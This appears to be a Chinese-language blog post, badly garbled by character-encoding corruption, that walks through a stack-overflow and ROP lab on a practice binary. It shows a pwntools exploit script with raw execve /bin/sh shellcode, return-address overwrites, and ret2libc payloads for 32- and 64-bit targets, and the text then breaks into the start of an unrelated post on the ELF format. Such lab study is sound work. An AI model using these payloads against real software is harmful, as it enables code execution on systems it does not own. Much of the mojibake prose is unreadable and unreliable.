==åˆ†æpwntoolsåœ¨ROPæ–¹é¢å®ç°çš„åŸç†== 3.Experimental process and analysis3.0 Environment Settingsç¼–è¯‘ç”Ÿæˆrop1ï¼Œå¹¶å…³é—­ASLR 3.1 gdbè°ƒè¯•rop1åœ¨vulnå¤„è®¾æ–­ç‚¹ï¼š è§‚å¯Ÿåˆ°bufæ•°ç»„çš„é¦–åœ°å€ä¸º[ebp-0x88]ï¼Œä»¥æ­¤åœ°å€ä¸ºä¾æ®è¿›è¡Œrop1.pyè·å–çœŸå®åœ°å€ 3.2 rop1.pyåˆ†æå†™å…¥ä¸€ä¸ªé”™è¯¯çš„è¿”å›åœ°å€å¾—åˆ°coreè½¬å‚¨æ–‡ä»¶1234567891011from pwn import *p = process(&#x27;rop1&#x27;)#gdb.attach(p,&#x27;b vuln&#x27;)#shellcode = asm(shellcraft.sh())shellcode=b&#x27;jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80&#x27;shellcode_addr = 0xdeadbeefpayload = shellcode.ljust(0x8c,b&#x27;a&#x27;)+p32(shellcode_addr)p.sendline(payload)p.interactive() gdbåˆ†æè½¬å‚¨æ–‡ä»¶ç¨‹åºç”±äºè®¿é—®äº†ä¸€æ®µä¸å¯è®¿é—®çš„å†…å­˜è€Œå¯¼è‡´å´©æºƒï¼Œæ­¤æ—¶ESPæŒ‡é’ˆåº”è¯¥æŒ‡å‘è¿”å›åœ°å€çš„ä¸‹ä¸€åœ°å€ è®¡ç®—æ­¤æ—¶ESPç›¸å¯¹bufé¦–åœ°å€åç§»ä¸ºï¼š0x4(è¿”å›åœ°å€)+0x8c(buffæ•°ç»„+ebp)=0x90 æ‰€ä»¥bufèµ·å§‹åœ°å€ä¸ºESP-0x90,å†™å…¥pyè„šæœ¬ 1shellcode_addr&#x3D;0xffffd1e0 æˆåŠŸGetShell å…³äºGDBè°ƒè¯•çš„åˆ†ægdbä¸»è¦åŠŸèƒ½çš„å®ç°ä¾èµ–äºä¸€ä¸ªç³»ç»Ÿå‡½æ•°ptraceï¼Œé€šè¿‡manæ‰‹å†Œå¯ä»¥äº†è§£åˆ°ï¼Œptraceå¯ä»¥è®©çˆ¶è¿›ç¨‹è§‚å¯Ÿå’Œæ§åˆ¶å…¶å­è¿›ç¨‹çš„æ£€æŸ¥ã€æ‰§è¡Œï¼Œæ”¹å˜å…¶å¯„å­˜å™¨å’Œå†…å­˜çš„å†…å®¹ï¼Œä¸»è¦åº”ç”¨äºæ‰“æ–­ç‚¹ï¼ˆä¹Ÿæ˜¯gdbçš„ä¸»è¦åŠŸèƒ½ï¼‰å’Œæ‰“å°ç³»ç»Ÿè°ƒç”¨è½¨è¿¹ã€‚ ptraceå‡½æ•°åŸå‹å¦‚ä¸‹ 1234#include &lt;sys/ptrace.h&gt;long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); gbdè°ƒè¯•ptraceåŸºæœ¬æµç¨‹ gdbè°ƒè¯•ä¸€ä¸ªæ–°è¿›ç¨‹ï¼šé€šè¿‡forkå‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œåœ¨å­è¿›ç¨‹ä¸­æ‰§è¡Œptrace(PTRACE_TRACEME, 0, 0, 0)å‡½æ•°ï¼Œç„¶åé€šè¿‡execv()è°ƒç”¨å‡†å¤‡è°ƒè¯•çš„ç¨‹åºã€‚ attachåˆ°å·²è¿è¡Œè¿›ç¨‹ï¼šå°†pidä¼ é€’ç»™gdbï¼Œç„¶åæ‰§è¡Œptrace(PTRACE_ATTACH, pid, 0, 0)ã€‚ åœ¨ä½¿ç”¨å‚æ•°ä¸ºPTRACE_TRACEMEæˆ–PTRACE_ATTACHçš„ptraceç³»ç»Ÿè°ƒç”¨å»ºç«‹è°ƒè¯•å…³ç³»ä¹‹åï¼Œäº¤ä»˜ç»™ç›®æ ‡ç¨‹åºçš„ä»»ä½•ä¿¡å·ï¼ˆé™¤SIGKILLä¹‹å¤–ï¼‰éƒ½å°†è¢«gdbå…ˆè¡Œæˆªè·ï¼Œgdbå› æ­¤æœ‰æœºä¼šå¯¹ä¿¡å·è¿›è¡Œç›¸åº”å¤„ç†ï¼Œå¹¶æ ¹æ®ä¿¡å·çš„å±æ€§å†³å®šåœ¨ç»§ç»­ç›®æ ‡ç¨‹åºè¿è¡Œæ—¶æ˜¯å¦å°†ä¹‹å‰æˆªè·çš„ä¿¡å·å®é™…äº¤ä»˜ç»™ç›®æ ‡ç¨‹åºã€‚ ==å…³äºgdbè°ƒè¯•ä¸­çœ‹åˆ°çš„bufæ•°ç»„é¦–åœ°å€å’Œè°ƒè¯•coreè½¬å‚¨æ–‡ä»¶ä¸ä¸€è‡´çš„è§£é‡Š==åŸºäºgdbè°ƒè¯•åŸç†ï¼Œå¯ä»¥å¾—çŸ¥gdbçš„è°ƒè¯•ä¼šå½±å“bufâ€™åœ¨å†…å­˜çš„ä½ç½®ï¼Œè°ƒè¯•æ—¶gdb forkå‡ºå­çº¿ç¨‹æ‰§è¡Œrop1ï¼Œrop1ç¯å¢ƒå˜é‡ç»§æ‰¿è‡ªgdbï¼Œå †æ ˆå‘ç”Ÿåç§»ï¼Œbufåœ°å€åç§»ã€‚ core dump æ˜¯è¿›ç¨‹ç»ˆæ­¢è¿è¡Œæ—¶è¿›ç¨‹åœ°å€ç©ºé—´å†…å®¹å’Œè¿›ç¨‹æœ‰å…³çŠ¶æ€çš„ä¿¡æ¯çš„ä¿å­˜ï¼Œæ˜¯å®é™…è¿è¡Œæ—¶çš„æ•°æ®ï¼Œæ­¤bufåœ°å€æ˜¯çœŸå®è¿è¡Œçš„åœ°å€ã€‚ ==ä¸é€šè¿‡Pwntoolså·¥å…·ï¼Œæ‰‹åŠ¨GetShell==åœ¨åˆ†æå®Œæ¯•GDBç”±äºè‡ªå·±çš„ç¯å¢ƒå˜é‡ä¼šæ”¹å˜buffè¿è¡Œæ—¶åœ°å€åï¼Œ ä¸‹é¢é€šè¿‡ä»…ç”¨GDBè°ƒè¯•å®ç°getShellè¿‡ç¨‹ã€‚ 1.é¦–å…ˆè¦è§£å†³å¦‚ä½•è·å–äºŒè¿›åˆ¶shellcodeç”¨pwntoolsä¸­çš„ç”Ÿæˆshellcodeæ¨¡å—ç”Ÿæˆï¼Œä½†æ˜¯å¾—åˆ°çš„æ•°æ®ä¸æ˜¯bytesç±»å‹çš„è¦è¿›è¡Œè½¬æ¢ æ–¹æ³•1 å°†pwntoolsç”Ÿæˆçš„shellcodeæ•°æ®ç›´æ¥ç”¨write()å‡½æ•°é€šè¿‡â€™ab+â€™çš„æ–¹å¼ä»¥äºŒè¿›åˆ¶å†™å…¥æ–‡ä»¶ æ–¹æ³•2 åˆ©ç”¨python -m â€˜print(bâ€shellcodeâ€)â€™è¾“å…¥å¯¹åº”çš„shellcodeåˆ°æ–‡ä»¶ï¼Œæ­¤å¤„è¸©å‘ç‚¹ï¼šå¿…é¡»å†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå› ä¸ºpython3å¯¹å­—èŠ‚æ•°æ®å’Œå­—ç¬¦ä¸²æ•°æ®åšäº†ä¸¥æ ¼åŒºåˆ†ã€‚(ç”±äºæ­¤å¤„è¸©å‘å¯¼è‡´è¾“å…¥shellcodeæœ‰é—®é¢˜å¯¼è‡´åç»­æœ‰å¤§é‡æ—¶é—´åœ¨debug)ç®€å•è®°å½•ä¸‹debugè¿‡ç¨‹ï¼Œé€šè¿‡010editå®šä½writeå†™å…¥çš„shellcodeå’Œpython æ–¹æ³•å†™å…¥çš„shellcodeåŒºåˆ«ã€‚ æ³¨ï¼šjustwriteæ˜¯ç”¨writeæ–¹æ³•äºŒè¿›åˆ¶å†™å…¥ justpythonæ˜¯é€šè¿‡ä¸Šè¿°pythonæ–¹æ³•å†™å…¥ã€‚ æ–¹æ³•3 åˆ©ç”¨ echo -e -n â€œ\\x11\\x22â€ &gt; shellcode -eè½¬ä¹‰åæ–œæ  -nä¸æ·»åŠ è¡Œå°¾è¡Œæ ‡è¯†ç¬¦ é€šè¿‡ä»¥ä¸Šä»»æ„ä¸€ç§æ–¹æ³•æœ€åå‡å¯å¾—åˆ°äºŒè¿›åˆ¶å­˜å‚¨çš„shellcode 2.å°†äºŒè¿›åˆ¶shellcodeä½œä¸ºæ ‡å‡†è¾“å…¥ä¼ å…¥read()å‡½æ•°read(0,buf,128)å‡½æ•°0è¡¨ç¤ºä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–ï¼Œæ­¤å¤„ä¸éš¾æƒ³åˆ°å¯ä»¥é€šè¿‡linuxçš„pipeç®¡é“æœºåˆ¶ä½œä¸ºæ ‡å‡†è¾“å…¥ä¼ é€’bufç»™./rop1å‡½æ•° ä¸Šè¿°å‘½ä»¤å«ä¹‰ï¼šå°†bin_with_gdb(shellcode)ä½œä¸ºæ ‡å‡†è¾“å…¥å¹¶æ‰§è¡Œï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸå†™å…¥ 3.ä¿®æ”¹è¦†ç›–çš„è¿”å›åœ°å€ä¸º0xdeadbeefç„¶åç¡®å®šshellcodeé¦–åœ°å€(åŒgdb dumpè¿‡ç¨‹)æ­¤å¤„å’Œgdb coreè¿‡ç¨‹é‡å¤ä¸åšå±•å¼€ï¼Œæœ€ç»ˆå¯ä»¥å¾—åˆ°æ­£ç¡®çš„bufâ€™åœ°å€ï¼Œç†è®ºä¸Šæ‰§è¡Œå°±å¯getshell(âŒ) 4.æ— æ³•è°ƒå‡ºshellcodeåˆ†æDebugä¿®æ”¹æ­£ç¡®bufåœ°å€åç„¶åç”Ÿæˆç›¸åº”çš„shellcodeå†è½¬ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå†é€šè¿‡ç®¡é“ä¼ å…¥ï¼Œä½†æ˜¯gdbæ‰§è¡Œå´æŠ¥é”™ã€‚ç»“æœå¦‚ä¸‹ï¼š é¦–å…ˆå¯ä»¥ç¡®å®šçš„æ˜¯æˆåŠŸè°ƒå‡ºäº† shell ï¼Œæ­¤å¤„æ˜¯ bin/dash ï¼ŒæŸ¥çœ‹å‘ç° sh:symbolic link to dash å°±æ˜¯è¯´ bin/shè¢«æˆåŠŸæ‰§è¡Œä½†æ˜¯é‡å®šå‘åˆ°äº†dashï¼Œæ­¤æ—¶å¯ä»¥ç¡®å®šsystemå‡½æ•°æˆåŠŸæ‰§è¡Œ åˆ†æå…·ä½“æŠ¥é”™ä¿¡æ¯ ä¿¡æ¯1ï¼š /bin/dash: 1: jhh///sh/binï¿½ï¿½h\u0001\u0001\u0001\u0001ï¿½4\u0001\u00011ï¿½Qj\u0004Y\u0001ï¿½Qï¿½ï¿½1ï¿½j å†rçš„è¯å°±ä¸€è‡´é‡å¤è¿™ä¸ªæŠ¥é”™å›æ˜¾ã€‚ æ­¤å¤„çœç•¥å†—é•¿è¯•é”™å’ŒæŸ¥èµ„æ–™åˆ†æç›´æ¥ç»™å‡ºåŸå› ã€‚ åœ¨gdb r &lt; argsæ‰§è¡Œçš„æ—¶å€™ï¼Œæ­¤è¿‡ç¨‹å°†argsä½œä¸ºæ ‡å‡†è¾“å…¥ï¼Œç„¶åå°†shellcodeè¾“å…¥åˆ°readå‡½æ•°,æ­¤è¿‡ç¨‹é¡ºåˆ©æ‰§è¡Œï¼ŒæˆåŠŸè°ƒå‡ºdashï¼Œé—®é¢˜åœ¨äºå¦‚æœä¸ä¿®æ”¹argså€¼ï¼Œåç»­æ‰€æœ‰æ¶‰åŠæ ‡å‡†è¾“å…¥çš„è¿‡ç¨‹ gdbéƒ½é»˜è®¤å°†argsçš„å†…å®¹ä½œä¸ºæ ‡å‡†è¾“å…¥ï¼Œæ‰€ä»¥è¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆä¼šæœ‰/bin/dash: + shellcodeçš„å›æ˜¾ï¼Œä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆè¿›ç¨‹ä¼šä¸€ç›´å¡åœ¨è¿™é‡Œ(æ˜¯å› ä¸ºè°ƒèµ·çš„systemå‡½æ•°ä¸€ç›´åœ¨é‡å¤æ‰§è¡Œ /bin/dash + shellcode)çš„è¿‡ç¨‹ã€‚ è§£å†³æ–¹æ³•ï¼šåœ¨è¾“å…¥å®Œshellcodeåç½®ç©ºæ ‡å‡†è¾“å…¥ï¼Œæ­¤æ—¶systemå‚æ•°å°†ä»é”®ç›˜è¯»å–å¾—åˆ°äº¤äº’ç•Œé¢ã€‚ åˆ†æï¼ˆpwntoolsä¸­çš„ p.interactive()è¿™ä¸ªè¿‡ç¨‹å…¶å®å°±æ˜¯ä¿®æ”¹æ ‡å‡†è¾“å…¥åˆ°é”®ç›˜ï¼‰ ==ä¸é€šè¿‡Pwntoolsï¼Œä¹Ÿä¸é€šè¿‡GDBè¿›è¡ŒROPçš„å°è¯•==æå‡ºé—®é¢˜==ä¸€ä¸ªé—®é¢˜==ï¼šä¸Šè¿°gdbè°ƒè¯•è¿‡ç¨‹ä¸­å¾—åˆ°çš„bufé¦–åœ°å€æ˜¯ ./rop1 è¿‡ç¨‹ä¸­bufçš„é¦–åœ°å€å—ï¼Ÿ ç­”æ¡ˆæ˜¯ï¼šä¸æ˜¯ ==éªŒè¯è¯´æ˜==ï¼šåˆ©ç”¨gdbè°ƒè¯•å‡ºçš„shellcode æ‰§è¡Œ ./rop1 &lt; shellcode å‘ç°æ®µå¼‚å¸¸ï¼ˆå…¶å®å°±æ˜¯å­˜åœ¨éæ³•çš„è¿”å›åœ°å€æˆ–è€…æ ˆå¸§ç»“æ„æœ‰é—®é¢˜ï¼‰ ==ç†è®ºè§£é‡Š==:(Thanks to StackoverflowğŸ˜Š)æ­¤å¤„å°†å¯¹GDBå½±å“bufåœ°å€è¿›è¡Œå…·ä½“è§£é‡Šï¼Œå…³é”®åœ¨äºenvçš„æ”¹å˜ï¼Œä¼šå½±å“bufé¦–åœ°å€çš„åç§»ã€‚ Environment variables are stored together with command line arguments at the top of the process memory layout, above the stack. DemoéªŒè¯12345678910111213#include &lt;stdio.h&gt;int main(int argc, char *argv[], char *envp[]) &#123; int *rsp; printf(&quot;env: %p\\narg: %p\\nrsp: %p\\n&quot;, envp, argv, &amp;rsp); while (*envp != NULL) &#123; printf(&quot;%s\\n&quot;, *envp); ++envp; &#125; return 0;&#125; æ­£å¸¸æ‰§è¡Œï¼š GDBè°ƒè¯•æ‰§è¡Œï¼š å¯¹æ¯”å³å¯å‘ç°rspä½ç½®å‘ç”Ÿäº†åç§»ï¼Œè¿™æ˜¯ç”±äºgdbè°ƒè¯•çš„æ—¶å€™å…ˆæ‰§è¡Œæœ¬èº«mainå‡½æ•°ï¼Œç„¶åforkå‡ºå­è¿›ç¨‹æ‰§è¡Œ è¢«è°ƒè¯•çš„å‡½æ•°ï¼Œå­è¿›ç¨‹çš„ç¯å¢ƒå˜é‡æ˜¯ç»§æ‰¿è‡ªgdbçš„mainå‡½æ•°ï¼Œè¿™å°±å¯¼è‡´äº†ç¯å¢ƒå˜é‡çš„ä¸åŒï¼Œç»§è€Œå¯¼è‡´bufåç§»é‡ä¸åŒ å°è¯•èƒ½æ‰¾åˆ°./rop1æ‰§è¡Œæ—¶bufæ•°ç»„ä½ç½®å¹¶getshell.gdbè°ƒè¯•æ—¶å€™æ‰§è¡Œrop1ç¯å¢ƒå˜é‡ç»§æ‰¿è‡ªgdbï¼Œpwntoolsæ‰§è¡Œrop1çš„æ—¶å€™ç¯å¢ƒå˜é‡ç»§æ‰¿è‡ªæ‰§è¡Œpythonç¨‹åºï¼Œé‚£ä¹ˆèƒ½å¦å¾—åˆ°æ­£å¸¸ ./rop1æ‰§è¡Œçš„bufé¦–åœ°å€å¹¶æ‰§è¡Œshellcodeå‘¢ã€‚ç†è®ºä¸Šå¯ä»¥ã€‚ é¦–å…ˆä¾æ—§å…ˆå†™0xdeadbeefä½œä¸ºè¿”å›åœ°å€çš„shellcodeå¹¶ç”ŸæˆäºŒè¿›åˆ¶æ–‡ä»¶ ä¸åšå±•å¼€ ç”±äº å¹¶ä¸ä¼šç”Ÿæˆcoreæ–‡ä»¶ï¼Œè¿™é‡Œåˆ©ç”¨dmesgæŸ¥çœ‹segment faultä¿¡æ¯ï¼ˆå› ä¸ºæ²¡æœ‰ç”Ÿæˆcoreæ–‡ä»¶æ— æ³•gdbè°ƒè¯•ï¼‰ ps:dmesgå­˜å‚¨æ‰€æœ‰dumpä¿¡æ¯ å¾—åˆ°espä¿¡æ¯ï¼Œå‡å»0x90ç®—å‡ºshellcodeé¦–åœ°å€ï¼Œä¿®æ”¹shellcodeå¹¶ç”ŸæˆäºŒè¿›åˆ¶æ–‡ä»¶ ç†è®ºä¸Šï¼Œæ˜¯å¯ä»¥å®Œç¾é€šè¿‡ ./rop1 &lt; bin_without_gdbæ‰§è¡Œshellcodeï¼Œä½†æ˜¯å´ä»€ä¹ˆä¹Ÿæ²¡æœ‰å‘ç”Ÿï¼ï¼ï¼ å¯ä»¥ç¡®å®šçš„æ˜¯shellcodeæ²¡é—®é¢˜ï¼Œä¸ç„¶æ‰§è¡Œä¼šæŠ¥é”™ï¼Œè¿˜å¯ä»¥ç¡®å®šçš„æ˜¯æ§åˆ¶æµæ˜¯è·³è½¬åˆ°äº†shellcode,å› ä¸ºæ²¡æœ‰è®©è¾“å…¥ä¿¡æ¯çš„è¿‡ç¨‹ï¼Œä¹Ÿæ²¡æœ‰hello ropå›æ˜¾ã€‚ åˆ†æ ä¾æ—§æ˜¯æ ‡å‡†è¾“å…¥çš„åŸå› ï¼Œbin_without_gdbä½œä¸ºæ ‡å‡†è¾“å…¥é€šè¿‡ç®¡é“ä¼ é€’ç»™rop1ï¼Œç„¶åæ­£å¸¸æ‰§è¡Œshellcodeè°ƒç”¨systemå‡½æ•°æ‰§è¡Œbin/shï¼Œä½†æ˜¯é—®é¢˜åœ¨äºè°ƒç”¨bin/shæ²¡æœ‰æ­£ç¡®çš„ç”¨æˆ·å‚æ•°ä¼ å…¥æ‰€ä»¥æ­¤çº¿ç¨‹ç›´æ¥è·³è¿‡ç„¶åç»“æŸçº¿ç¨‹ï¼Œä¹Ÿä¸è¿”å›mainå‡½æ•°ï¼Œä¹Ÿå°±ä¸æ‰§è¡Œprint(â€œhello ropâ€) è§£å†³åŠæ³• åœ¨æ‰§è¡Œåˆ° bin/shçº¿ç¨‹æ—¶æ›´æ”¹æ ‡å‡†è¾“å…¥ï¼Œç„¶åé€šè¿‡é”®ç›˜ä¼ å…¥å‘½ä»¤å³å¯ï¼Œå…¶å®è¿™ä¹Ÿå°±æ˜¯gdbè°ƒè¯•å’Œpwntoolsåšçš„è¿‡ç¨‹ã€‚ã€‚ æ–¹æ³•æ€»ç»“ï¼šgdbæ‰‹åŠ¨æ‰§è¡Œshellcodeçš„è¿‡ç¨‹èƒ½åŠ å¼ºå¯¹ç¯å¢ƒå˜é‡ã€gdbè°ƒè¯•èƒ½åŠ›ã€ç®¡é“ä¼ é€’å‚æ•°ã€æ ‡å‡†è¾“å…¥çš„ç†è§£ã€‚ é€šè¿‡pwntoolsæ‰§è¡ŒROPæ–¹ä¾¿å¿«æ·ï¼Œä¸éœ€è¦çŸ¥é“åº•å±‚å®ç°åŸç†ï¼Œåªéœ€è¦ç†è§£æ ˆæº¢å‡ºå†…å®¹å³å¯ï¼Œä¸éœ€è¦è€ƒè™‘å…·ä½“ç¯å¢ƒå˜é‡ã€ç®¡é“é‡å®šå‘ã€æ ‡å‡†è¾“å…¥æµçš„é—®é¢˜ï¼Œæ˜¯å°è£…å¥½çš„ä¾¿æ·å·¥å…·ã€‚ æ€»ä¹‹ï¼Œpwntoolså°±æ˜¯æˆ‘ä»¬gdbè°ƒè¯•è¿‡ç¨‹çš„ä¸€ä¸ªå°è£…ï¼Œäº†è§£å…¶åº•å±‚å®ç°åŸç†æ˜¯å­¦ä¹ çš„ç›®çš„ï¼Œå®é™…ROPæ—¶è¿˜æ˜¯é€‰ç”¨pwntoolsæ›´æ–¹ä¾¿å¿«æ·ã€‚ 3.3 rop2.py(32-bit)åˆ†æç¯å¢ƒå‡†å¤‡ å¼€å¯No-eXecute æ•°æ®æ‰€åœ¨é¡µä¸å¯æ‰§è¡Œä¿æŠ¤ éªŒè¯ ç¡®å®šsysåœ°å€ æ‰¾åˆ°libc.soåº“ä¸­systemå‚æ•°(â€œ/bin/shâ€)åœ°å€ æ‰¾åˆ°systemå‚æ•°/bin/shåœ°å€ä¸º0xf7f650af payload = bâ€™aâ€™*0x8c + p32(sys_addr)+p32(0xdeadbeef)+p32(binsh_addr) GetShell 3.4 rop3.py(64-bit)åˆ†æç¯å¢ƒå‡†å¤‡&amp;å·¥å…·å®‰è£… å¯»æ‰¾å¯ç”¨gadget ç¡®å®šç›¸å¯¹libcåç§»ä¸º0x215bfï¼Œè®¡ç®—å¾—æŒ‡ä»¤åœ°å€ä¸ºï¼š0x7ffff7a035bf æŸ¥çœ‹sys_addr sys_addr=0x7ffff7a31550 æŸ¥çœ‹â€/bin/shâ€åœ°å€ binsh_addr=0x7ffff7b95e1a ä¿®æ”¹pwnè„šæœ¬å¹¶æ‰§è¡Œéœ€è¦æ³¨æ„çš„æ˜¯64ä½æƒ…å†µä¸‹,offesetå‘ç”Ÿäº†å˜åŒ–=0x80(æ•°ç»„åç§»)+0x8(ebpå¡«å……) å½“æˆ‘ä»¬æ‰€æœ‰å·¥ä½œéƒ½åšå®Œä¹‹åå‘ç°å¹¶ä¸èƒ½æ­£å¸¸GetShellã€‚ã€‚ ==RSP 16bytes Alig and wirte our own code== Step 1 : èµ·åˆæ˜¯ä»¥ä¸ºæ˜¯offset æˆ–è€…systemåœ°å€ä»€ä¹ˆçš„ç®—é”™äº†ï¼Œå†é‡å¤Næ¬¡éƒ½è®¡ç®—å¾—åˆ°åŒä¸€ç»“æœæ—¶ï¼Œæ’é™¤æ­¤é—®é¢˜ã€‚ Step 2: Search On Google åˆæ­¥ç¡®å®šé—®é¢˜ä¸º 64ä½ç¨‹åºåœ¨callå‡½æ•°å‰è¦æ±‚RSP16 byteså¯¹é½ï¼Œå¸¦å…¥æœ¬é¢˜å…·ä½“æƒ…å¢ƒï¼šåˆ©ç”¨gadgetè·å–rdiå¹¶å°†systemå‡½æ•°è°ƒç”¨å‚æ•°â€/bin/shâ€å…¥æ ˆ,ç„¶åæ‰§è¡Œsystemå‡½æ•°ï¼Œé—®é¢˜å‡ºåœ¨call systemæ—¶rspä¸æ˜¯16çš„å€æ•°ã€‚ Step 3: é—®é¢˜æº¯æº ä¸‹è½½æœ¬å‡½æ•°ä½¿ç”¨çš„åº“å‡½æ•°ï¼Œå®šä½systemå‡½æ•°è°ƒç”¨å‰æ“ä½œï¼Œä½¿ç”¨IDAé™æ€è°ƒè¯• å…³é”®å¤„MovapsæŒ‡ä»¤ 1234movaps XMM,XMM&#x2F;m128 movaps XMM&#x2F;m128,XMMæŠŠæºå­˜å‚¨å™¨å†…å®¹å€¼é€å…¥ç›®çš„å¯„å­˜å™¨,å½“æœ‰m128æ—¶, å†…å­˜åœ°å€å¿…é¡»æ˜¯16å­—èŠ‚å¯¹é½çš„ã€‚XMMWORDæ—¨åœ¨è¡¨ç¤ºä¸m128ç›¸åŒçš„ç±»å‹,åˆšå¥½è¿™é‡Œç¬¦åˆç¬¬äºŒæ¡ã€‚ é—®é¢˜å·²ç»ååˆ†æ¸…æ™°ï¼Œä¸‹é¢æˆ‘ä»¬ç”¨GDBå®é™…è°ƒè¯•ä»¥ä¸‹ç¡®è®¤æ˜¯å¦ç¡®å®æ˜¯ç”±RSPæ²¡å¯¹é½å¯¼è‡´çš„Systemä¸èƒ½æ‰§è¡Œã€‚ Step 3: gdbé—®é¢˜éªŒè¯ è°ƒè¯•è½¬å‚¨æ–‡ä»¶coreç¡®è®¤ç¡®å®æ˜¯rspæœªå¯¹é½æ‰€è‡´ Step 4: Sove RSP Align Problems èµ·åˆæ²¡æœ‰å¤šæƒ³ä»¥ä¸ºå•çº¯å¢åŠ payloadé•¿åº¦(å³ æœ«å°¾å¢åŠ 8ä¸ªbâ€™aâ€™)ï¼Œä¿®æ”¹åå´å‘ç°ä¾æ—§æŠ¥é”™ï¼ ğŸ‘†ä¸Šé¢é—®é¢˜ä¸»è¦å‡ºåœ¨å¯¹æ ˆå¸§ç»“æ„ç†è§£å¹¶ä¸é€å½»ï¼ŒRSPæ˜¯éšç€æ‰§è¡Œæ±‡ç¼–æŒ‡ä»¤è€Œå˜åŒ–çš„ï¼è€Œpayloadå¤šæº¢å‡ºçš„8ä¸ªbyteså¯¹RSPä¸ä¼šæœ‰ä»»ä½•å½±å“ï¼Œé€šè¿‡gdbè°ƒè¯•ä¹ŸéªŒè¯äº†RSPä¾æ—§ä¸å˜ ç®€å•Googleåå‘ç°è§£å†³åŠæ³•,gadgetä¸€ä¸ªreturnæŒ‡ä»¤å³å¯,ç„¶ååœ¨è°ƒç”¨System å‡½æ•°ä¹‹å‰ æ‰§è¡ŒretæŒ‡ä»¤ä½¿å¾—rspå¢åŠ 8æ»¡è¶³16byteså¯¹é½è¦æ±‚ã€‚ ä¿®æ”¹åä»£ç å¦‚ä¸‹ éªŒè¯ï¼š 4.My Summary å·¥å…·æ–¹é¢ï¼šåˆæ­¥äº†è§£gdbå·¥ä½œåŸç†ï¼Œèƒ½ä½¿ç”¨gdbå¯¹ç¨‹åºè¿›è¡Œè°ƒè¯•å’Œæ ˆå¸§åˆ†æï¼ŒæŒæ¡gccç¼–è¯‘å¼€å¯ç›¸å…³ä¿æŠ¤ï¼Œåˆæ­¥äº†è§£NXç»•è¿‡ã€‚å­¦ä¼šä½¿ç”¨ROPgadgetsã€dmesgã€‚ å†…å®¹æ–¹é¢ï¼Œäº†è§£PLTå’ŒGOTè¡¨çš„åŸç†ï¼ŒæŒæ¡åŸºæœ¬ROPæ ˆæº¢å‡ºï¼Œå¯¹Pwntoolsåº•å±‚å®ç°åŸç†æœ‰äº†åˆæ­¥äº†è§£ï¼Œäº†è§£elfæ–‡ä»¶æ‰§è¡Œæ—¶çš„Envç¯å¢ƒå˜é‡ã€‚ æŠ€èƒ½æ–¹é¢ï¼Œé€šè¿‡æ‰‹åŠ¨è°ƒè¯•ã€å‘ç°é—®é¢˜ã€å®é™…è§£å†³â€å…³äºgdbè°ƒè¯•ä¸­çœ‹åˆ°çš„bufæ•°ç»„é¦–åœ°å€å’Œè°ƒè¯•coreè½¬å‚¨æ–‡ä»¶ä¸ä¸€è‡´çš„è§£é‡Šâ€ã€â€64-bitç¨‹åºä¸‹RSPæŒ‡é’ˆå¯¹é½é—®é¢˜â€ï¼Œè‡ªä¸»æŸ¥é˜…èµ„æ–™å’Œåˆ†æçš„èƒ½åŠ›å¾—åˆ°é”»ç‚¼æå‡(æœ‰é—®é¢˜å°±æ‰¾Stackoverflow)ã€‚","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"}],"tags":[{"name":"Rop","slug":"Rop","permalink":"http://example.com/tags/Rop/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"linux_ELFæ–‡ä»¶æ ¼å¼","slug":"Linux_ELFæ–‡ä»¶","date":"2021-08-15T17:24:39.000Z","updated":"2022-03-25T13:51:43.000Z","comments":true,"path":"2021/08/16/Linux_ELFæ–‡ä»¶/","link":"","permalink":"http://example.com/2021/08/16/Linux_ELF%E6%96%87%E4%BB%B6/","excerpt":"","text":"linux_ELFåœ¨Linuxç¯å¢ƒä¸‹ç¼–è¯‘è¿‡ç¨‹ä¸€æ–‡ä¸­ç®€å•çš„æåŠäº†linuxçš„ELFæ–‡ä»¶æ ¼å¼çš„é“¾æ¥çš„è¿‡ç¨‹ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šä¸Šï¼Œæœ¬æ–‡å†æ¬¡æ¢ç©¶ELFæ–‡ä»¶ç±»å‹ã€ç¨‹åºå¤´ã€èŠ‚å¤´ã€ç¬¦å·ã€é‡å®šä½ã€åŠ¨æ€é“¾æ¥çš„å†…å®¹ã€‚ ELFæ–‡ä»¶æ ¼å¼ELFæ–‡ä»¶ç±»å‹ ç›®æ ‡æ–‡ä»¶æœ‰ä¸‰ç§ç±»å‹ï¼š å¯é‡å®šä½æ–‡ä»¶ï¼ˆRelocatable Fileï¼‰åŒ…å«é€‚åˆäºä¸å…¶ä»–ç›®æ ‡æ–‡ä»¶é“¾æ¥æ¥åˆ›å»ºå¯æ‰§è¡Œæ–‡ä»¶æˆ–è€…å…±äº«ç›®æ ‡æ–‡ä»¶çš„ä»£ç å’Œæ•°æ®ã€‚ å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆExecutable Fileï¼‰åŒ…å«é€‚åˆäºæ‰§è¡Œçš„ä¸€ä¸ªç¨‹åºï¼Œæ­¤æ–‡ä»¶è§„å®šäº† exec() å¦‚ä½•åˆ›å»ºä¸€ä¸ªç¨‹åºçš„è¿›ç¨‹æ˜ åƒã€‚ å…±äº«ç›®æ ‡æ–‡ä»¶ï¼ˆShared Object Fileï¼‰åŒ…å«å¯åœ¨ä¸¤ç§ä¸Šä¸‹æ–‡ä¸­é“¾æ¥çš„ä»£ç å’Œæ•°æ®ã€‚é¦–å…ˆé“¾æ¥ç¼–è¾‘å™¨å¯ä»¥å°†å®ƒå’Œå…¶å®ƒå¯é‡å®šä½æ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶ä¸€èµ·å¤„ç†ï¼Œç”Ÿæˆå¦å¤–ä¸€ä¸ªç›®æ 